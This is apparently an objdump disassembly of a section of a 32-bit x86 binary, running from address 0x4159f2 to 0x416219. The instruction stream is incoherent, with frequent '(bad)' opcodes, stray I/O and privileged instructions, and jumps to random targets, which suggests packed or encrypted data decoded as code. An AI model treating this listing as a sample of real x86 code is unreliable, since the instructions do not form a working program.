  4159f2:	fcomi  st,st(4)
  4159f4:	sahf   
  4159f5:	dec    ebp
  4159f6:	push   cs
  4159f7:	loopne 0x4159fa
  4159f9:	loopne 0x415a02
  4159fb:	sbb    ebx,ecx
  4159fd:	dec    edx
  4159fe:	add    BYTE PTR [edi],cl
  415a00:	jne    0x415993
  415a02:	xchg   ecx,eax
  415a03:	dec    ebp
  415a04:	js     0x4159a7
  415a06:	pushf  
  415a07:	jnp    0x4159ad
  415a09:	cld    
  415a0a:	(bad)  
  415a0b:	stos   BYTE PTR es:[edi],al
  415a0c:	stc    
  415a0d:	sar    DWORD PTR [edx+0x3d55cbad],1
  415a13:	into   
  415a14:	sbb    al,0xd7
  415a16:	and    DWORD PTR [eax],0xb2c7c71c
  415a1c:	dec    ebp
  415a1d:	add    DWORD PTR [edi],ebp
  415a1f:	adc    ebp,edi
  415a21:	pop    edi
  415a22:	mov    bh,0x85
  415a24:	adc    eax,0xbb25ee9e
  415a29:	mov    al,ds:0x91771dcb
  415a2e:	xchg   ebx,eax
  415a2f:	into   
  415a30:	mov    dl,0xd0
  415a32:	mov    ds:0xb131d88e,al
  415a37:	es test eax,0x685ed4ba
  415a3d:	mov    eax,esp
  415a3f:	add    ecx,DWORD PTR [edi]
  415a41:	jl     0x415abb
  415a43:	push   ebx
  415a44:	or     esp,ecx
  415a46:	test   BYTE PTR [edx+0x12391cf2],dh
  415a4c:	dec    eax
  415a4d:	outs   dx,DWORD PTR ds:[esi]
  415a4e:	test   al,0x9b
  415a50:	loopne 0x415a48
  415a52:	add    DWORD PTR [ebp-0xb25553e],0x25539ba3
  415a5c:	sti    
  415a5d:	(bad)  
  415a5e:	push   ebx
  415a5f:	xchg   edi,eax
  415a60:	shr    BYTE PTR [ebx],cl
  415a62:	cdq    
  415a63:	xchg   ecx,eax
  415a64:	lahf   
  415a65:	fmul   DWORD PTR [esp+ecx*2+0x76]
  415a69:	fisubr WORD PTR [edx]
  415a6b:	inc    esi
  415a6c:	dec    esi
  415a6d:	dec    esp
  415a6e:	inc    eax
  415a6f:	mov    dh,0xfa
  415a71:	into   
  415a72:	push   eax
  415a73:	call   0x3b53:0xd905e81b
  415a7a:	lods   eax,DWORD PTR gs:[esi]
  415a7c:	ins    DWORD PTR es:[edi],dx
  415a7d:	cmc    
  415a7e:	out    0x56,al
  415a80:	xchg   esi,eax
  415a81:	test   DWORD PTR [eax-0x585031e2],edx
  415a87:	arpl   WORD PTR [ebx-0x5e],cx
  415a8a:	jle    0x415a77
  415a8c:	into   
  415a8d:	and    al,0x36
  415a8f:	jmp    0x415aa1
  415a91:	xchg   ecx,eax
  415a92:	stos   DWORD PTR es:[edi],eax
  415a93:	lea    edx,[esi+0x42ceb17]
  415a99:	hlt    
  415a9a:	jle    0x415aff
  415a9c:	imul   esi,DWORD PTR [ebp-0x57f248e2],0x2e
  415aa3:	mul    bh
  415aa5:	push   edi
  415aa6:	cmp    DWORD PTR [esi-0x52ae6716],ebp
  415aac:	push   cs
  415aad:	cmp    DWORD PTR ds:0x46b49311,ebx
  415ab3:	cwde   
  415ab4:	ret    
  415ab5:	fdivr  st(7),st
  415ab7:	jno    0x415a83
  415ab9:	aas    
  415aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415abb:	adc    bl,ah
  415abd:	mov    ah,0x64
  415abf:	sub    bh,0x40
  415ac2:	icebp  
  415ac3:	inc    ebx
  415ac4:	sbb    ecx,esp
  415ac6:	scas   eax,DWORD PTR es:[edi]
  415ac7:	ins    DWORD PTR es:[edi],dx
  415ac8:	fimul  DWORD PTR [esi]
  415aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415acb:	nop
  415acc:	aaa    
  415acd:	icebp  
  415ace:	xchg   edx,eax
  415acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad0:	cld    
  415ad1:	cmp    BYTE PTR [edx+0x4be4c9fa],bh
  415ad7:	push   ecx
  415ad8:	push   esi
  415ad9:	int    0xd7
  415adb:	jb     0x415ae4
  415add:	sbb    ebx,DWORD PTR [esi]
  415adf:	fwait
  415ae0:	mov    cl,0xf0
  415ae2:	dec    DWORD PTR [eax-0x12a3e124]
  415ae8:	ficom  WORD PTR [ecx+0x22]
  415aeb:	test   eax,0x3507a918
  415af0:	int3   
  415af1:	mov    DWORD PTR [esi],eax
  415af3:	loope  0x415a9b
  415af5:	inc    edx
  415af6:	rdtsc  
  415af8:	mov    ebp,0x99ae5392
  415afd:	mov    ebp,0x56543376
  415b02:	dec    eax
  415b03:	push   edx
  415b04:	mov    dl,0xb0
  415b06:	adc    dl,BYTE PTR [ecx+0x73a61223]
  415b0c:	rcl    DWORD PTR [edi-0x2d0f9a52],0xc5
  415b13:	mov    cl,bh
  415b15:	ret    0xebd7
  415b18:	cdq    
  415b19:	ja     0x415b19
  415b1b:	push   eax
  415b1c:	aad    0x2c
  415b1e:	sbb    al,BYTE PTR [ecx]
  415b20:	test   al,0xa4
  415b22:	pop    es
  415b23:	mov    ah,BYTE PTR [ecx-0x397e24f7]
  415b29:	leave  
  415b2a:	fisttp WORD PTR [edi+edx*2-0xe513ad7]
  415b31:	xor    eax,0x9b91fc76
  415b36:	cwde   
  415b37:	outs   dx,BYTE PTR ds:[esi]
  415b38:	dec    ebx
  415b39:	or     eax,0xe77b556c
  415b3e:	xor    eax,0xca7d78e5
  415b43:	hlt    
  415b44:	jle    0x415b5b
  415b46:	xor    esp,esi
  415b48:	xchg   esp,eax
  415b49:	pushf  
  415b4a:	fiadd  DWORD PTR [edx+ebp*1+0x1a]
  415b4e:	(bad)  
  415b4f:	int3   
  415b50:	jnp    0x415b7d
  415b52:	jle    0x415b14
  415b54:	mov    al,0xd7
  415b56:	iret   
  415b57:	jns    0x415b8d
  415b59:	out    0xc2,al
  415b5b:	add    ch,BYTE PTR [ebx+0x18]
  415b5e:	pop    eax
  415b5f:	clc    
  415b60:	ins    BYTE PTR es:[edi],dx
  415b61:	aaa    
  415b62:	icebp  
  415b63:	dec    ecx
  415b64:	sub    al,0xf1
  415b66:	test   eax,0x7bfcfc77
  415b6b:	xchg   esi,eax
  415b6c:	(bad)  
  415b6d:	jge    0x415bc5
  415b6f:	mov    al,ds:0x6f491b1f
  415b74:	neg    edi
  415b76:	xchg   esi,eax
  415b77:	mov    eax,0x7badc2a3
  415b7c:	out    0xff,al
  415b7e:	test   DWORD PTR [edi-0x36],esi
  415b81:	daa    
  415b82:	cmp    BYTE PTR [edi-0x7f],0x7e
  415b86:	rcr    DWORD PTR ds:0xc661715b,0xed
  415b8d:	stos   BYTE PTR es:[edi],al
  415b8e:	sub    al,0xa7
  415b90:	cdq    
  415b91:	mov    DWORD PTR [ebp+0x9],ecx
  415b94:	div    DWORD PTR [eax+0x48]
  415b97:	lods   al,BYTE PTR ds:[esi]
  415b98:	cmp    eax,0xb5be1c23
  415b9d:	jp     0x415be4
  415b9f:	xchg   ecx,eax
  415ba0:	daa    
  415ba1:	push   edx
  415ba2:	and    BYTE PTR es:[eax],0x3a
  415ba6:	push   ebx
  415ba7:	jo     0x415b9c
  415ba9:	ss mov al,0xea
  415bac:	cmc    
  415bad:	popa   
  415bae:	loop   0x415c25
  415bb0:	in     al,0xf2
  415bb2:	mov    edi,0x9583c93a
  415bb7:	ja     0x415be2
  415bb9:	xor    DWORD PTR [esi+0x40],0xffffff90
  415bbd:	int3   
  415bbe:	jnp    0x415c34
  415bc0:	fidivr WORD PTR [edi]
  415bc2:	push   eax
  415bc3:	add    DWORD PTR [ecx-0x32ce34c1],ebx
  415bc9:	mul    esi
  415bcb:	xchg   ecx,eax
  415bcc:	(bad)  
  415bcd:	js     0x415b72
  415bcf:	sub    bh,BYTE PTR [ebx-0x53]
  415bd2:	push   0x7a2fad10
  415bd7:	jecxz  0x415b67
  415bd9:	fdiv   DWORD PTR [edx+0x5b94215a]
  415bdf:	retf   0xe4ae
  415be2:	sub    ch,BYTE PTR [ecx+0x6e021a49]
  415be8:	sub    eax,0xca8ffff5
  415bed:	popf   
  415bee:	stos   BYTE PTR es:[edi],al
  415bef:	(bad)  
  415bf0:	gs dec ecx
  415bf2:	mov    ebp,0x3f363b14
  415bf7:	data16 fimul DWORD PTR [edx+edx*1+0x41]
  415bfc:	outs   dx,BYTE PTR ds:[esi]
  415bfd:	ins    DWORD PTR es:[edi],dx
  415bfe:	dec    esp
  415bff:	add    edx,DWORD PTR ds:0x129dc1c9
  415c05:	and    al,0x45
  415c07:	es in  al,dx
  415c09:	inc    ecx
  415c0a:	in     eax,dx
  415c0b:	hlt    
  415c0c:	adc    BYTE PTR [ecx-0x16],al
  415c0f:	dec    edi
  415c10:	dec    ebp
  415c11:	or     al,0xfb
  415c13:	xchg   esi,eax
  415c14:	bound  eax,QWORD PTR [ebx]
  415c16:	mov    eax,0x3eb713d1
  415c1b:	jbe    0x415bce
  415c1d:	push   es
  415c1e:	mov    DWORD PTR [ebp+0x20],ecx
  415c21:	rcr    DWORD PTR [edi-0x56],0xd8
  415c25:	mov    ebp,0x2e2804ad
  415c2a:	and    DWORD PTR [edx],edi
  415c2c:	push   esi
  415c2d:	jge    0x415c27
  415c2f:	jno    0x415bd5
  415c31:	(bad)  
  415c32:	mov    ecx,0x166e5363
  415c37:	dec    esp
  415c38:	into   
  415c39:	jp     0x415c3a
  415c3b:	sti    
  415c3c:	pop    ss
  415c3d:	adc    eax,0x748b260e
  415c42:	add    al,0xd6
  415c44:	pop    esi
  415c45:	inc    edi
  415c47:	xchg   ecx,eax
  415c48:	in     al,dx
  415c49:	fdivr  DWORD PTR [esi-0x22]
  415c4c:	jno    0x415cb7
  415c4e:	add    bh,BYTE PTR [esi-0x27]
  415c51:	lahf   
  415c52:	adc    al,0xd9
  415c54:	sbb    BYTE PTR [edx+0x11],bh
  415c57:	popa   
  415c58:	loope  0x415cbf
  415c5a:	xchg   edi,eax
  415c5b:	mov    bh,BYTE PTR [ecx]
  415c5d:	gs pop ss
  415c5f:	xchg   esi,eax
  415c60:	xchg   ebx,eax
  415c61:	mov    ebp,0x71e9317a
  415c66:	mov    al,ds:0x9349c9d1
  415c6b:	imul   ebx,DWORD PTR [edi],0xffffffa5
  415c6e:	stc    
  415c6f:	sbb    ax,0xd39a
  415c73:	hlt    
  415c74:	sahf   
  415c75:	loope  0x415c3e
  415c77:	jmp    0xbb36:0xdefcbc03
  415c7e:	out    dx,eax
  415c7f:	cmp    bh,BYTE PTR [ebp-0x1f]
  415c82:	out    0xa1,al
  415c84:	adc    DWORD PTR [eax],esi
  415c86:	arpl   di,sp
  415c88:	gs inc esi
  415c8a:	and    dh,BYTE PTR [esi]
  415c8c:	das    
  415c8d:	inc    edx
  415c8e:	gs mov bh,0xec
  415c91:	fimul  WORD PTR [eax+esi*2-0x58]
  415c95:	fwait
  415c96:	aas    
	...
  415d13:	add    BYTE PTR [ebp-0x29],dl
  415d16:	mov    edx,0x7defba87
  415d1b:	xlat   BYTE PTR ds:[ebx]
  415d1c:	lea    esp,[esi+edx*4+0x6a]
  415d20:	sbb    al,BYTE PTR [edx+0x1f09a4f]
  415d26:	add    DWORD PTR [eax],eax
  415d28:	imul   eax,DWORD PTR [edi],0x0
  415d2b:	add    BYTE PTR [esi-0x60],al
  415d2e:	ret    
  415d2f:	arpl   WORD PTR [ecx-0x33],dx
  415d32:	cwde   
  415d33:	stos   BYTE PTR es:[edi],al
  415d34:	aam    0x8e
  415d36:	ins    DWORD PTR es:[edi],dx
  415d37:	stc    
  415d38:	push   ebx
  415d39:	and    eax,0x5eefe0fc
  415d3e:	ins    DWORD PTR es:[edi],dx
  415d3f:	cld    
  415d40:	sbb    BYTE PTR [ebx-0x7],cl
  415d43:	mov    cl,0xfb
  415d45:	pop    ebp
  415d46:	pop    ds
  415d47:	pop    esi
  415d48:	and    bl,BYTE PTR [ebx+0x230cf982]
  415d4e:	retf   
  415d4f:	(bad)  
  415d50:	pop    ebx
  415d51:	pop    eax
  415d52:	fldcw  WORD PTR [ebx-0x65]
  415d55:	mov    al,0xc8
  415d57:	mov    edi,0x75ebd696
  415d5c:	sub    eax,0x560a620a
  415d61:	mov    BYTE PTR [edx-0x6e],bl
  415d64:	aas    
  415d65:	fsubr  st,st(3)
  415d67:	leave  
  415d68:	xchg   ebx,eax
  415d69:	loop   0x415d58
  415d6b:	rcr    DWORD PTR [esp+ebx*8+0x16],0xb
  415d70:	inc    bl
  415d72:	retf   0xebbf
  415d75:	xor    eax,0x11a8dbb3
  415d7a:	xchg   edi,eax
  415d7b:	or     dl,BYTE PTR [esi+0x51]
  415d7e:	jno    0x415d28
  415d80:	pop    ss
  415d81:	push   esp
  415d82:	dec    esp
  415d83:	lock lock jbe 0x415d46
  415d87:	call   0x932520c2
  415d8c:	jne    0x415d26
  415d8e:	lods   al,BYTE PTR ds:[esi]
  415d8f:	sbb    BYTE PTR [edx+0x5df06383],al
  415d95:	mov    al,0x45
  415d97:	iret   
  415d98:	and    eax,0x5e6cfcce
  415d9d:	mov    ebp,0xb7f45097
  415da2:	mov    eax,ds:0xf45a1e84
  415da7:	int3   
  415da8:	mov    eax,0x86fedcb7
  415dad:	or     ecx,ebx
  415daf:	cdq    
  415db0:	or     DWORD PTR [eax-0x77],0x37b20228
  415db7:	sti    
  415db8:	mov    edi,0xc3f31acf
  415dbd:	rol    DWORD PTR [edx+0x1767cb82],1
  415dc3:	sub    BYTE PTR [edx+0x16],ah
  415dc6:	aaa    
  415dc7:	in     al,dx
  415dc8:	jne    0x415e1e
  415dca:	shl    esi,1
  415dcc:	addr16 daa 
  415dce:	and    DWORD PTR [edi-0x3b],edi
  415dd1:	aaa    
  415dd2:	jmp    0x415e43
  415dd4:	sar    ebp,0x89
  415dd7:	fnstsw WORD PTR [esi+eax*4+0x6f]
  415ddb:	push   es
  415ddc:	cli    
  415ddd:	inc    esi
  415dde:	rcl    DWORD PTR [esi-0x753ada50],0x11
  415de5:	push   ds
  415de6:	jp     0x415dd8
  415de8:	nop
  415de9:	(bad)  
  415deb:	inc    edx
  415dec:	mov    eax,0xa03471a6
  415df1:	dec    ebp
  415df2:	and    edx,ebx
  415df4:	les    ebx,FWORD PTR [edx+ebx*8+0xc18ef65]
  415dfb:	stos   BYTE PTR es:[edi],al
  415dfc:	adc    ah,ch
  415dfe:	cmp    ch,bl
  415e00:	cmp    ebx,esi
  415e02:	shr    BYTE PTR [ebp+0x73],cl
  415e05:	leave  
  415e06:	test   BYTE PTR [edi-0x49],cl
  415e09:	mov    ebx,0xc3f2b88c
  415e0e:	jb     0x415dc1
  415e10:	adc    al,0xdf
  415e12:	jecxz  0x415e89
  415e14:	push   ss
  415e15:	or     ecx,esi
  415e17:	jl     0x415e43
  415e19:	mov    ds:0x7a810e8e,al
  415e1e:	adc    al,0xa0
  415e20:	xchg   edi,eax
  415e21:	mov    cl,0xf7
  415e23:	jns    0x415dee
  415e25:	add    BYTE PTR [edi+0x62],bh
  415e28:	mov    dl,0xd6
  415e2a:	in     al,0x1d
  415e2c:	xchg   esi,eax
  415e2d:	and    BYTE PTR [ebx],ah
  415e2f:	in     eax,dx
  415e30:	ss jb  0x415de6
  415e33:	in     eax,dx
  415e34:	add    edx,DWORD PTR [edx-0x7bd6f079]
  415e3a:	mov    edx,0xb02442f5
  415e3f:	retfw  
  415e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e42:	outs   dx,DWORD PTR ds:[esi]
  415e43:	inc    edx
  415e44:	xor    al,0x3a
  415e46:	std    
  415e47:	add    edx,DWORD PTR [edi+edi*8]
  415e4a:	and    ah,dh
  415e4c:	icebp  
  415e4d:	xchg   edx,eax
  415e4e:	cld    
  415e4f:	and    al,0x4
  415e51:	xchg   ebp,eax
  415e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e53:	push   ebx
  415e54:	icebp  
  415e55:	loopne 0x415e00
  415e57:	popf   
  415e58:	cs cmp ch,dh
  415e5b:	sbb    dh,BYTE PTR [edx+ebp*2]
  415e5e:	gs push 0xaca13f15
  415e64:	loop   0x415eca
  415e66:	and    DWORD PTR [eax-0x6d],ebx
  415e69:	out    0x55,eax
  415e6b:	and    bl,bl
  415e6d:	push   ebx
  415e6e:	inc    esi
  415e6f:	test   eax,0xcc4e07f
  415e74:	xchg   ebx,eax
  415e75:	jge    0x415ec1
  415e77:	or     edx,DWORD PTR [edi-0x78]
  415e7a:	mov    al,0x5f
  415e7c:	fmul   QWORD PTR [edi]
  415e7e:	das    
  415e7f:	imul   edi,DWORD PTR [ecx],0x3ef8c066
  415e85:	out    0xbe,eax
  415e87:	or     esi,DWORD PTR [edi+eax*1-0x54]
  415e8b:	sbb    al,bl
  415e8d:	ja     0x415e1c
  415e8f:	jno    0x415ece
  415e91:	adc    DWORD PTR [eax],ebp
  415e93:	sub    eax,0xdace7639
  415e98:	push   edi
  415e99:	data16 int3 
  415e9b:	loope  0x415ee7
  415e9d:	sub    esp,DWORD PTR [edi+0x51]
  415ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ea1:	mov    al,0x5d
  415ea3:	scas   al,BYTE PTR es:[edi]
  415ea4:	(bad)  
  415ea5:	jo     0x415e99
  415ea7:	push   ds
  415ea8:	add    BYTE PTR [ebx+edi*4],bl
  415eab:	push   ss
  415eac:	mov    bh,0x81
  415eae:	add    DWORD PTR [ebp+0x77],0xffffff91
  415eb2:	fdivr  QWORD PTR [eax]
  415eb4:	mov    WORD PTR [edi+0x8],ss
  415eb7:	add    eax,0xe2ca18ff
  415ebc:	pop    esp
  415ebd:	jae    0x415ef9
  415ebf:	mov    ebp,0x4f10a1e3
  415ec4:	js     0x415f2f
  415ec6:	dec    edi
  415ec7:	mov    DWORD PTR [ecx+0x7a11a659],0x73299ee5
  415ed1:	mov    cl,0x69
  415ed3:	clc    
  415ed4:	cmp    al,0x14
  415ed6:	sbb    cl,BYTE PTR [edi-0x3e9482ae]
  415edc:	xor    esi,ebp
  415ede:	add    DWORD PTR [ebx-0x5ccde1dc],0x8bb01e51
  415ee8:	(bad)  
  415ee9:	repz pop esp
  415eeb:	dec    ebx
  415eec:	(bad)  
  415eee:	loop   0x415eb9
  415ef0:	or     al,al
  415ef2:	mov    DWORD PTR [edx+0x36],edx
  415ef5:	or     ebp,0x133da735
  415efb:	loop   0x415f3f
  415efd:	das    
  415efe:	sbb    ebx,DWORD PTR [edx-0x4]
  415f01:	sub    ecx,DWORD PTR [ebx+0x3]
  415f04:	inc    ebp
  415f05:	inc    eax
  415f06:	jecxz  0x415f3a
  415f08:	xlat   BYTE PTR ds:[ebx]
  415f09:	fimul  DWORD PTR [ecx+eax*4-0xb]
  415f0d:	stos   DWORD PTR es:[edi],eax
  415f0e:	(bad)  [eax+edi*1+0x5ce15acb]
  415f15:	mov    ebp,0xc84d6c6a
  415f1a:	cmp    dh,BYTE PTR [esp+edi*8-0x66]
  415f1e:	mov    ds:0x1df15ea2,eax
  415f23:	(bad)  
  415f24:	out    dx,eax
  415f25:	lods   al,BYTE PTR ds:[esi]
  415f26:	xor    eax,0x5ede5747
  415f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f2c:	fs jns 0x415f3c
  415f2f:	cdq    
  415f30:	pusha  
  415f31:	loope  0x415ec6
  415f33:	mov    WORD PTR [esi+0x63e44e20],fs
  415f39:	clc    
  415f3a:	inc    ebp
  415f3b:	jne    0x415f72
  415f3d:	imul   eax,DWORD PTR [eax+0x4960a074],0x6600e967
  415f47:	jne    0x415ed6
  415f49:	adc    DWORD PTR ds:0x3a1952d7,esp
  415f4f:	loopne 0x415f84
  415f51:	data16 fmul QWORD PTR [esi+eax*4-0x425c5165]
  415f59:	(bad)  
  415f5b:	mov    esp,0x4fc0581d
  415f60:	test   BYTE PTR [eax+ecx*4],ah
  415f63:	inc    ebp
  415f64:	and    eax,DWORD PTR [ecx]
  415f66:	les    edx,FWORD PTR [eax]
  415f68:	mov    edi,0x87b49ff7
  415f6d:	inc    esi
  415f6e:	iret   
  415f6f:	lds    esi,FWORD PTR [esi+0x1f]
  415f72:	fwait
  415f73:	jo     0x415f15
  415f75:	lods   eax,DWORD PTR gs:[esi]
  415f77:	push   0x2c
  415f79:	xlat   BYTE PTR ds:[ebx]
  415f7a:	push   eax
  415f7b:	push   ss
  415f7c:	dec    ecx
  415f7d:	outs   dx,BYTE PTR ds:[esi]
  415f7e:	iret   
  415f7f:	ret    
  415f80:	pop    ebp
  415f81:	inc    esp
  415f82:	sbb    bh,BYTE PTR [esi]
  415f84:	into   
  415f85:	ret    
  415f86:	ja     0x415f2c
  415f88:	imul   esp,DWORD PTR [ebp+0x12513f09],0xdbb35956
  415f92:	fwait
  415f93:	adc    ebx,edx
  415f95:	inc    esp
  415f96:	call   0x5069dcb0
  415f9b:	push   ebx
  415f9c:	leave  
  415f9d:	std    
  415f9e:	aad    0x40
  415fa0:	cmp    ah,BYTE PTR [ecx+0xa]
  415fa3:	and    eax,0x40131c01
  415fa8:	loope  0x415f2f
  415faa:	adc    DWORD PTR [ebp+eax*4+0x35],0xffffffcb
  415faf:	inc    edx
  415fb0:	les    esp,FWORD PTR [edx+0x4e]
  415fb3:	mov    ah,0xc3
  415fb5:	mov    eax,ds:0x9c2e2654
  415fba:	dec    ebx
  415fbb:	out    dx,al
  415fbc:	int    0x43
  415fbe:	jp     0x416027
  415fc0:	push   0x44
  415fc2:	inc    ecx
  415fc3:	fs repz mov edi,0xd89b24dd
  415fca:	dec    ebp
  415fcb:	lock add al,0xa1
  415fce:	mov    WORD PTR [eax+eiz*4+0x63],?
  415fd2:	adc    cl,dl
  415fd4:	or     DWORD PTR [ecx],0xf2566023
  415fda:	addr16 adc al,0x91
  415fdd:	test   DWORD PTR [edi-0x23e40591],esi
  415fe3:	dec    edi
  415fe4:	xlat   BYTE PTR ds:[ebx]
  415fe5:	mov    ds,WORD PTR [esi-0x6560fb6a]
  415feb:	clc    
  415fec:	mov    esi,0xce31d2b4
  415ff1:	cmp    edx,DWORD PTR [edi]
  415ff3:	cmp    DWORD PTR [ebp-0x63ca69d3],edx
  415ff9:	call   0x9c86022f
  415ffe:	add    DWORD PTR [eax+ebx*8-0x66],0xc33b5acb
  416006:	sbb    edi,esp
  416008:	enter  0x9bf4,0xc7
  41600c:	jo     0x415fdf
  41600e:	cs push ds
  416010:	sub    BYTE PTR [eax+0x31],0xf3
  416014:	repz ret 
  416016:	(bad)  
  416017:	retf   0x9797
  41601a:	lods   eax,DWORD PTR ds:[esi]
  41601b:	repz fld DWORD PTR fs:[eax]
  41601f:	xchg   BYTE PTR ds:0xc1bfbcae,al
  416025:	scas   al,BYTE PTR es:[edi]
  416026:	loop   0x41609a
  416028:	jecxz  0x415fea
  41602a:	push   0x808774ff
  41602f:	sbb    eax,0xb4bbb5ec
  416034:	xor    eax,0x2cdab167
  416039:	mov    ds:0xe12fba57,al
  41603e:	and    eax,0x14ce21d3
  416043:	nop
  416044:	pop    es
  416045:	retf   
  416046:	rol    BYTE PTR [eax],0x4e
  416049:	(bad)  
  41604a:	aam    0x44
  41604c:	(bad)  
  41604e:	in     eax,dx
  41604f:	icebp  
  416050:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416052:	in     al,0x29
  416054:	dec    ebx
  416055:	push   ds
  416056:	mov    ebp,DWORD PTR [ecx]
  416058:	or     dl,BYTE PTR [ecx-0x1427f065]
  41605e:	cwde   
  41605f:	gs and edi,DWORD PTR gs:[ebp+0x5c]
  416064:	inc    eax
  416065:	and    esi,DWORD PTR [eax]
  416067:	addr16 retf 
  416069:	cmp    eax,0x90a7ce7b
  41606e:	mov    WORD PTR [ebx],?
  416070:	stc    
  416071:	aas    
  416072:	cwde   
  416073:	push   ebp
  416074:	aam    0x6d
  416076:	int    0xeb
  416078:	add    ecx,esi
  41607a:	jnp    0x4160ba
  41607c:	mov    ah,0xcc
  41607e:	dec    ebp
  41607f:	(bad)  [edi+0x595f5340]
  416085:	and    eax,0xa3bc6bd4
  41608a:	sub    eax,0xc50232e6
  41608f:	jno    0x4160e8
  416091:	inc    esi
  416092:	nop
  416093:	lea    ebx,[ecx+ebx*1-0x59]
  416097:	adc    al,0x7c
  416099:	jl     0x416032
  41609b:	sub    ebp,ebp
  41609d:	xchg   edi,eax
  41609e:	popa   
  41609f:	cmc    
  4160a0:	cli    
  4160a1:	or     BYTE PTR [edx+0x18],bh
  4160a4:	fld    QWORD PTR [edi]
  4160a6:	dec    ebx
  4160a7:	adc    DWORD PTR [edx-0x13],0x4d274501
  4160ae:	stos   DWORD PTR es:[edi],eax
  4160af:	add    eax,0x1db2f4f8
  4160b4:	loope  0x4160f1
  4160b6:	xor    edi,DWORD PTR [edi-0x255913cb]
  4160bc:	leave  
  4160bd:	out    dx,eax
  4160be:	or     BYTE PTR ds:0x9c5f6ca7,ah
  4160c4:	xor    eax,0x85d3275e
  4160c9:	(bad)  
  4160ca:	cmp    eax,0xad39a8e9
  4160cf:	pop    ebx
  4160d0:	or     ch,cl
  4160d2:	pop    es
  4160d3:	lds    eax,FWORD PTR [edi]
  4160d5:	jne    0x4160d6
  4160d7:	jmp    0x416157
  4160d9:	sahf   
  4160da:	pop    ecx
  4160db:	mov    bl,0x3d
  4160dd:	ss enter 0xb552,0xe6
  4160e2:	xor    sp,bx
  4160e5:	mov    ah,0x7b
  4160e7:	push   edx
  4160e8:	add    dl,BYTE PTR [esi+0x297c7ea9]
  4160ee:	jmp    0x27be:0x474ea282
  4160f5:	out    0xe,al
  4160f7:	push   ebx
  4160f8:	addr16 fabs 
  4160fb:	or     edi,ebx
  4160fd:	repnz inc ebx
  4160ff:	xchg   edi,eax
  416100:	push   ebp
  416101:	stos   DWORD PTR es:[edi],eax
  416102:	jmp    0x4160e3
  416104:	test   al,0x16
  416106:	shl    DWORD PTR ds:0xdc8a4108,0xe
  41610d:	lahf   
  41610e:	test   eax,0x9208f62c
  416113:	int    0x38
  416115:	dec    ebp
  416116:	or     bh,dl
  416118:	mov    ?,ecx
  41611a:	xchg   edi,eax
  41611b:	in     al,0xbc
  41611d:	clc    
  41611e:	ret    
  41611f:	mov    BYTE PTR [ecx],0xf
  416122:	iret   
  416123:	inc    esp
  416124:	repz jecxz 0x4160f8
  416127:	sbb    dl,al
  416129:	mov    bh,0x38
  41612b:	jl     0x4160c0
  41612d:	xchg   ecx,eax
  41612e:	imul   ebx,ebp,0x3c120f6a
  416134:	fsub   QWORD PTR [eax+0x36]
  416137:	jmp    0x2612d87e
  41613c:	pushf  
  41613d:	test   BYTE PTR [edx],cl
  41613f:	push   eax
  416140:	push   ss
  416141:	fisub  DWORD PTR ds:0x8488af3d
  416147:	xor    esi,esp
  416149:	xchg   BYTE PTR [edi+0x41522114],al
  41614f:	int    0x15
  416151:	mov    ch,0x85
  416153:	in     eax,0xf6
  416155:	jmp    0x1992:0xb15dcb13
  41615c:	cmp    edx,esi
  41615e:	stc    
  41615f:	jmp    0xb05dedc0
  416164:	pop    edi
  416165:	dec    ebp
  416166:	loope  0x4160f2
  416168:	leave  
  416169:	aam    0x2f
  41616b:	pop    ds
  41616c:	mov    dh,BYTE PTR [ebx+0x1f]
  41616f:	xor    edx,DWORD PTR [edx]
  416171:	cmp    BYTE PTR [eax],0x7c
  416174:	pushf  
  416175:	shr    ch,1
  416177:	inc    ecx
  416178:	xchg   ecx,eax
  416179:	test   al,0x2a
  41617b:	dec    ebx
  41617c:	in     eax,0x7f
  41617e:	mov    eax,ds:0x5acbf5d0
  416183:	je     0x416143
  416185:	push   edi
  416186:	jecxz  0x41612f
  416188:	arpl   WORD PTR [eax+0x6848666c],si
  41618e:	ficom  DWORD PTR [ebp-0x2792ef54]
  416194:	jae    0x4161cc
  416196:	mov    dl,BYTE PTR [ecx]
  416198:	loopne 0x4161d7
  41619a:	into   
  41619b:	inc    ebp
  41619c:	xchg   ebx,eax
  41619d:	jle    0x4161a1
  41619f:	xchg   edi,eax
  4161a0:	ficom  WORD PTR [esi]
  4161a2:	pusha  
  4161a3:	mov    edi,0x9b06a93f
  4161a8:	mov    ch,0x14
  4161aa:	xchg   BYTE PTR [esi+esi*1],dh
  4161ad:	add    eax,0x2e302b56
  4161b2:	cmp    ah,BYTE PTR [ebx+edx*2+0x7a52b914]
  4161b9:	scas   al,BYTE PTR es:[edi]
  4161ba:	(bad)  
  4161bb:	(bad)  
  4161bc:	dec    edi
  4161bd:	sbb    ah,BYTE PTR [ebx]
  4161bf:	mov    esi,0xb5ecc26b
  4161c4:	push   edx
  4161c5:	jmp    0x12d6:0xb058d64b
  4161cc:	cmp    BYTE PTR [ebx],cl
  4161ce:	push   ecx
  4161cf:	push   ss
  4161d0:	repz or BYTE PTR [edx+0x32],ch
  4161d4:	jl     0x41620b
  4161d6:	jnp    0x41621b
  4161d8:	jne    0x4161e7
  4161da:	cmp    bh,dl
  4161dc:	cmp    eax,0x8f0ed0dc
  4161e1:	out    dx,eax
  4161e2:	out    0x57,al
  4161e4:	repnz fnsave [edx-0x5599e73]
  4161eb:	out    dx,al
  4161ec:	loopne 0x41625c
  4161ee:	stos   DWORD PTR es:[edi],eax
  4161ef:	sub    al,0x94
  4161f1:	push   es
  4161f2:	or     dl,al
  4161f4:	ret    
  4161f5:	mov    ebx,0xeec16a02
  4161fa:	push   esp
  4161fb:	je     0x41620c
  4161fd:	adc    DWORD PTR ds:0x607d4d85,edx
  416203:	test   al,0x5f
  416205:	cld    
  416206:	fist   WORD PTR [ebp+0x413e6d5d]
  41620c:	mov    ebx,DWORD PTR [ebp-0x2f8b1b0d]
  416212:	inc    esp
  416213:	mov    cl,0x4b
  416215:	push   edi
  416216:	jno    0x41623c
  416218:	(bad)  
  416219:	stc    
